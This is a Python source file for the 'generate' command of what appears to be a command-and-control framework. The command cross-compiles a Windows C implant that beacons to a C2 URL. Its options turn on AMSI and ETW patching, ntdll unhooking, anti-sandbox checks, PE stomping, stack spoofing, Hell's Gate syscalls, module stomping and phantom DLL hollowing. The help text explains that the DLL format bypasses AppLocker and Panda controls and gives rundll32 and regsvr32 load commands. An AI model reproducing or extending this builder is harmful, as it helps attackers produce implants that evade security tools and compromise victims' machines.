"""
CLI 'generate' command — cross-compile C agent with embedded config.

Usage in operator shell:
  generate                                    (defaults: current listener URL, keys/server_pub.pem)
  generate --url https://c2.example.com/api/v1 --sleep 30 --jitter 20
  generate --arch x86 --kill-date 2026-12-31
  generate --url https://... --sleep 10 --format dll
"""

import shlex
from pathlib import Path

from rich.console import Console

console = Console(stderr=True)


def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
    """Parse generate arguments and invoke the C agent build."""

    # Parse arguments from the command string
    parts = shlex.split(args_str) if args_str else []
    opts = {
        "url": "",
        "sleep": 60,
        "jitter": 25,
        "arch": "x64",
        "kill_date": "",
        "magic": 0xDEADF00D,
        "output": None,
        "format": "exe",
        "no_evasion": False,
        "no_sandbox": False,
        "no_unhook": False,
        "no_etw": False,
        "no_amsi": False,
        "no_pe_stomp": False,
        "no_stack_spoofing": False,
        "no_indirect_syscalls": False,
        "no_module_stomp": False,
        "no_phantom_hollow": False,
        "no_crypt": False,
        "target_os": "win10",
        "debug": False,
    }

    # Boolean flags (no argument following)
    bool_flags = {
        "--no-evasion": "no_evasion",
        "--no-sandbox": "no_sandbox",
        "--no-unhook": "no_unhook",
        "--no-etw": "no_etw",
        "--no-amsi": "no_amsi",
        "--no-pe-stomp": "no_pe_stomp",
        "--no-stack-spoofing": "no_stack_spoofing",
        "--no-indirect-syscalls": "no_indirect_syscalls",
        "--no-module-stomp": "no_module_stomp",
        "--no-phantom-hollow": "no_phantom_hollow",
        "--no-crypt": "no_crypt",
        "--debug": "debug",
    }

    i = 0
    while i < len(parts):
        if parts[i] in ("--url", "-u") and i + 1 < len(parts):
            opts["url"] = parts[i + 1]; i += 2
        elif parts[i] in ("--sleep", "-s") and i + 1 < len(parts):
            opts["sleep"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--jitter", "-j") and i + 1 < len(parts):
            opts["jitter"] = int(parts[i + 1]); i += 2
        elif parts[i] in ("--arch", "-a") and i + 1 < len(parts):
            opts["arch"] = parts[i + 1]; i += 2
        elif parts[i] == "--kill-date" and i + 1 < len(parts):
            opts["kill_date"] = parts[i + 1]; i += 2
        elif parts[i] == "--magic" and i + 1 < len(parts):
            m = parts[i + 1]
            opts["magic"] = int(m, 16) if m.startswith("0x") else int(m)
            i += 2
        elif parts[i] == "--target-os" and i + 1 < len(parts):
            val = parts[i + 1]
            if val not in ("win10", "win11"):
                console.print(f"[red]--target-os must be win10 or win11, got: {val}[/red]")
                return
            opts["target_os"] = val; i += 2
        elif parts[i] in ("--format", "-f") and i + 1 < len(parts):
            val = parts[i + 1]
            if val not in ("exe", "dll"):
                console.print(f"[red]--format must be exe or dll, got: {val}[/red]")
                return
            opts["format"] = val; i += 2
        elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
            opts["output"] = Path(parts[i + 1]); i += 2
        elif parts[i] in bool_flags:
            opts[bool_flags[parts[i]]] = True; i += 1
        elif parts[i] in ("--help", "-h"):
            _print_help()
            return
        else:
            console.print(f"[red]Unknown option: {parts[i]}[/red]")
            _print_help()
            return

    # Auto-detect listener URL if not specified
    if not opts["url"]:
        if listeners:
            info = listeners[0].info()
            scheme = "https" if "HTTPS" in info.get("type", "") else "http"
            host = info.get("interface", "127.0.0.1")
            if host == "0.0.0.0":
                host = "127.0.0.1"
            port = info.get("port", 8443)
            opts["url"] = f"{scheme}://{host}:{port}/api/v1"
            console.print(f"[dim]Using listener URL: {opts['url']}[/dim]")
        else:
            opts["url"] = "https://127.0.0.1:8443/api/v1"
            console.print("[yellow]No active listener — using default URL[/yellow]")

    # Find RSA key
    rsa_path = project_root / "keys" / "server_pub.pem"
    if not rsa_path.exists():
        console.print("[yellow]⚠ No RSA key found at keys/server_pub.pem[/yellow]")
        console.print("[yellow]  Run 'python scripts/generate_keys.py' first.[/yellow]")
        console.print("[yellow]  Building without RSA key (key exchange will fail).[/yellow]")
        rsa_path = None

    # Find profile
    profile_path = project_root / "profiles" / "default.yaml"
    if not profile_path.exists():
        profile_path = None

    # Check MinGW
    cc = "x86_64-w64-mingw32-gcc" if opts["arch"] == "x64" else "i686-w64-mingw32-gcc"
    import shutil
    if not shutil.which(cc):
        console.print(f"[red]✗ {cc} not found![/red]")
        console.print("[yellow]  Install mingw-w64:[/yellow]")
        console.print("[yellow]    sudo apt install mingw-w64[/yellow]")
        return

    fmt_label = "DLL" if opts["format"] == "dll" else "EXE"
    console.print(f"[cyan]Generating {opts['arch']} agent ({fmt_label})...[/cyan]")
    console.print(f"  C2 URL:    {opts['url']}")
    console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
    console.print(f"  Format:    {fmt_label}")
    if opts["kill_date"]:
        console.print(f"  Kill date: {opts['kill_date']}")

    # Import and invoke build
    import sys
    sys.path.insert(0, str(project_root / "scripts"))
    from build_agent_c import build_agent

    # Show evasion/debug flags
    active_flags = [k for k in ("debug", "no_evasion", "no_sandbox", "no_unhook",
                                 "no_etw", "no_amsi", "no_pe_stomp", "no_stack_spoofing",
                                 "no_indirect_syscalls", "no_module_stomp",
                                 "no_phantom_hollow", "no_crypt")
                    if opts[k]]
    if active_flags:
        console.print(f"  Flags:     {', '.join('--' + f.replace('_', '-') for f in active_flags)}")
    console.print(f"  Target OS: {opts['target_os']}")
    console.print()

    try:
        out_path = build_agent(
            project_root,
            listener_url=opts["url"],
            rsa_pubkey_path=rsa_path,
            sleep_sec=opts["sleep"],
            jitter_pct=opts["jitter"],
            kill_date=opts["kill_date"],
            magic=opts["magic"],
            arch=opts["arch"],
            output_path=opts["output"],
            profile_path=profile_path,
            no_evasion=opts["no_evasion"],
            no_sandbox=opts["no_sandbox"],
            no_unhook=opts["no_unhook"],
            no_etw=opts["no_etw"],
            no_amsi=opts["no_amsi"],
            no_pe_stomp=opts["no_pe_stomp"],
            no_stack_spoof=opts["no_stack_spoofing"],
            no_indirect_syscalls=opts["no_indirect_syscalls"],
            no_module_stomp=opts["no_module_stomp"],
            no_phantom_hollow=opts["no_phantom_hollow"],
            target_os=opts["target_os"],
            debug=opts["debug"],
            no_crypt=opts["no_crypt"],
            format=opts["format"],
        )
        size_kb = out_path.stat().st_size / 1024
        console.print(f"[green]✓ Agent built: {out_path} ({size_kb:.1f} KB)[/green]")
        if opts["format"] == "dll":
            console.print()
            console.print("[dim]Load with:[/dim]")
            console.print(f"[dim]  rundll32 {out_path.name},Start[/dim]")
            console.print(f"[dim]  regsvr32 /s {out_path.name}[/dim]")
    except FileNotFoundError as e:
        console.print(f"[red]✗ {e}[/red]")
    except RuntimeError as e:
        console.print(f"[red]✗ Build failed:[/red]")
        console.print(str(e))


def _print_help():
    console.print("""
[bold]generate[/bold] — Cross-compile C agent with embedded config

[bold]Options:[/bold]
  --url, -u URL         C2 callback URL (auto-detected from listener)
  --sleep, -s SEC       Beacon interval in seconds (default: 60)
  --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
  --arch, -a ARCH       x64 or x86 (default: x64)
  --format, -f FMT      Output format: exe (default) or dll
  --kill-date DATE      Agent self-destructs after YYYY-MM-DD
  --magic HEX           Packet magic bytes (default: 0xDEADF00D)
  --output, -o PATH     Output path (default: builds/agent_ARCH.exe|dll)

[bold]Evasion / Debug:[/bold]
  --debug               Enable agent debug log (%TEMP%\\agent_debug.log)
  --no-crypt            Skip polymorphic encryption (raw .exe, for debugging)
  --no-evasion          Disable ALL evasion features
  --no-sandbox          Disable anti-sandbox checks only
  --no-unhook           Disable ntdll unhooking only
  --no-etw              Disable ETW patching only
  --no-amsi             Disable AMSI patching only
  --no-pe-stomp         Disable PE header stomping only
  --no-stack-spoofing   Disable thread stack spoofing (even on win11)
  --no-indirect-syscalls Disable indirect syscalls (Hell's Gate)
  --no-module-stomp    Disable module stomping for BOF .text sections
  --no-phantom-hollow  Disable phantom DLL hollowing
  --target-os OS        Target OS: win10 or win11 (default: win10)
                        Stack spoofing only enabled on win11

[bold]DLL format notes:[/bold]
  The DLL format bypasses application execution controls (Panda, AppLocker)
  by loading the agent via a trusted Windows binary. Crypter is skipped
  (the trusted host handles on-disk reputation). Load with:
    rundll32 agent.dll,Start
    regsvr32 /s agent.dll

[bold]Examples:[/bold]
  generate
  generate --url https://cdn.example.com/api/v1 --sleep 30
  generate --url https://cdn.example.com/api/v1 --format dll
  generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
  generate --arch x86 --kill-date 2026-12-31
  generate --target-os win11
""")
